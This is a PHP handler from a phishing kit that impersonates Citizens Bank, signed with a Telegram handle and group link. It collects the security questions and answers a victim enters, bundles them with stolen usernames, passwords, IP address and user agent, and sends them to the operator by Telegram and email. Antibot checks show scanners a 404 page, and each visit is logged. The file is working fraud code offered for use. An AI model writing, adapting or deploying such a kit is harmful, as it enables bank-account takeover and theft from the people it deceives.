<?php
/*   
TELEGRAM @H4x0rxploit
JOIN US AT TELEGRAM GROUP : https://t.me/H4x0rxploits
*/
    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['q1'],
        $_POST['a1'],
        $_POST['q2'],
        $_POST['a2'],
        $_POST['q3'],
        $_POST['a3'],
        $_POST['q4'],
        $_POST['a4']
    )) {
        if (!$comps->checkEmpty(
            $_POST['q1'],
            $_POST['a1'],
            $_POST['q2'],
            $_POST['a2'],
            $_POST['q3'],
            $_POST['a3'],
            $_POST['q4'],
            $_POST['a4']
        )) {
            $_SESSION['q1'] = $_POST['q1'];
            $_SESSION['q2'] = $_POST['q2'];
            $_SESSION['q3'] = $_POST['q3'];
            $_SESSION['q4'] = $_POST['q4'];

            switch ($_SESSION['q1']) {
                case 1:
                    $_SESSION['q1'] = "What was the name of your High School?";
                    break;
                case 2:
                    $_SESSION['q1'] = "What is the name of the first company you worked for?";
                    break;
                case 3:
                    $_SESSION['q1'] = "In what city were you married? (Enter full name of city)";
                    break;
                case 4:
                    $_SESSION['q1'] = "What is your best friend's first name?";
                    break;
                case 5:
                    $_SESSION['q1'] = "In what city was your high school? (full name of city only)";
                    break;
                case 6:
                    $_SESSION['q1'] = "What is your maternal grandmother's first name?";
                    break;
                case 7:
                    $_SESSION['q1'] = "What is the first name of your oldest nephew?";
                    break;
                case 8:
                    $_SESSION['q1'] = "What is your maternal grandfather's first name?";
                    break;
                case 9:
                    $_SESSION['q1'] = "What is your father's middle name?";
                    break;
            }

            switch ($_SESSION['q2']) {
                case 1:
                    $_SESSION['q2'] = "In what city was your father born? (Enter full name of city only)";
                    break;
                case 2:
                    $_SESSION['q2'] = "What was the first name of your first manager?";
                    break;
                case 3:
                    $_SESSION['q2'] = "What was your high school mascot?";
                    break;
                case 4:
                    $_SESSION['q2'] = "What was the name of your first pet?";
                    break;
                case 5:
                    $_SESSION['q2'] = "What is your paternal grandmother's first name?";
                    break;
                case 6:
                    $_SESSION['q2'] = "In what city is your vacation home? (Enter full name of city only)";
                    break;
                case 7:
                    $_SESSION['q2'] = "What is the first name of the best man at your wedding?";
                    break;
                case 8:
                    $_SESSION['q2'] = "What is the first name of your oldest niece?";
                    break;
                case 9:
                    $_SESSION['q2'] = "What was the nickname of your grandfather?";
                    break;
            }

            switch ($_SESSION['q3']) {
                case 1:
                    $_SESSION['q3'] = "What was the name of the town your grandmother lived in? (Enter full name of town only)";
                    break;
                case 2:
                    $_SESSION['q3'] = "What was the name of your junior high school? (Enter only \"Riverdale\" for Riverdale Junior High School)";
                    break;
                case 3:
                    $_SESSION['q3'] = "In what city was your mother born? (Enter full name of city only)";
                    break;
                case 4:
                    $_SESSION['q3'] = "In what city were you born? (Enter full name of city only)";
                    break;
                case 5:
                    $_SESSION['q3'] = "What was the last name of your favorite teacher in final year of high school?";
                    break;
                case 6:
                    $_SESSION['q3'] = "What was your favorite restaurant in college?";
                    break;
                case 7:
                    $_SESSION['q3'] = "What street did your best friend in high school live on? (Enter full name of street only)";
                    break;
                case 8:
                    $_SESSION['q3'] = "What is your mother's middle name?";
                    break;
                case 9:
                    $_SESSION['q3'] = "What is your paternal grandfather's first name?";
                    break;
            }
            switch ($_SESSION['q4']) {
                case 1:
                    $_SESSION['q4'] = "Where did you meet your spouse for the first time? (Enter full name of city only)";
                    break;
                case 2:
                    $_SESSION['q4'] = "What was the name of your first girlfriend/boyfriend?";
                    break;
                case 3:
                    $_SESSION['q4'] = "What is the first name of the maid of honor at your wedding?";
                    break;
                case 4:
                    $_SESSION['q4'] = "In what city were you born? (Enter full name of city only)";
                    break;
                case 5:
                    $_SESSION['q4'] = "What was the last name of your favorite teacher in final year of high school?";
                    break;
                case 6:
                    $_SESSION['q4'] = "What was your favorite restaurant in college?";
                    break;
               
            }

            $_SESSION['a1'] = $_POST['a1'];
            $_SESSION['a2'] = $_POST['a2'];
            $_SESSION['a3'] = $_POST['a3'];
            $_SESSION['a4'] = $_POST['a4'];

            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: #209DB9;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-citizens {
                        color: #209DB9;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">V2.0 with telegram <span class="text-citizens">Citizens Bank</span> V1.0</h4>
                    <h2>(1) Security Questions from ' . $_SESSION['username'] . '</h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light">🧠 Security Questions</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Question 1: ' . $_SESSION['q1'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 1: ' . $_SESSION['a1'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3>Question 2: ' . $_SESSION['q2'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 2: ' . $_SESSION['a2'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3>Question 3: ' . $_SESSION['q3'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 3: ' . $_SESSION['a3'] . '</h3>
                        </div>

                        <div class="mt-2">
                            <h3>Question 3: ' . $_SESSION['q4'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Answer 3: ' . $_SESSION['a4'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">📱 Device Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            ' . $comps->userDetails() . '
                        </div>
                    </div>
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="https://t.me/V2.0 with telegram" target="_blank">V2.0 with telegram</a>, not for redistribution.</span>
                    </div>
                </div>
            ';
            $ipi = getenv("REMOTE_ADDR");
$useriagent = $_SERVER['HTTP_USER_AGENT'];
$telcontent = <<<EOT
»»————- ★[ 🦋🇵🇰🦋 Citizens Bank By MR.Haxor 🦋🇵🇰🦋 ]★ ————-««
[USER NAME]          : {$_SESSION['username']}
[PASSWORD]           : {$_SESSION['password']}
[USER NAME]          : {$_SESSION['1stuser']}
[PASSWORD]           : {$_SESSION['1stpassword']}
»»————- ★[ 🦋🇵🇰🦋 SECURITY 🦋🇵🇰🦋 ]★ ————-««
[Question No.1]      : {$_SESSION['q1']}
[Answer No.21]       : {$_SESSION['a1']}
[Question No.2]      : {$_SESSION['q2']}
[Answer No.2]        : {$_SESSION['a2']}
[Question No.3]      : {$_SESSION['q3']}
[Answer No.3]        : {$_SESSION['a3']}
[Question No.4]      : {$_SESSION['q4']}
[Answer No.4]        : {$_SESSION['a4']}
»»————- ★[ 🦋🇵🇰🦋 DEVICE INFO 🦋🇵🇰🦋 ]★ ————-««
IP      : $ipi
Agent   : $useriagent
»»————- ★[ 🦋🇵🇰🦋 contact telegram @H4x0rxploit🦋🇵🇰🦋 ]★ ————-««
\r\n\r\n
EOT;
if (isset($settings['telegram']) && $settings['telegram'] == "on"){
    if(isset($_SESSION['telegram']) || !$_SESSION['telegram']){
        $_SESSION['telegram'] = 1;
        if($comps->telegram($telcontent)){
            
        }
        //die($comps->headerX("../../Login/"));
    } 
}

            if ($comps->mailX("(1) Security Questions | Citizens Bank", $content)) {
                $comps->log(
                    "../../../Guard/Audio/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Security Questions\n\n"
                );
                die($comps->headerX("../../Login/details.php"));
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../../Guard/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }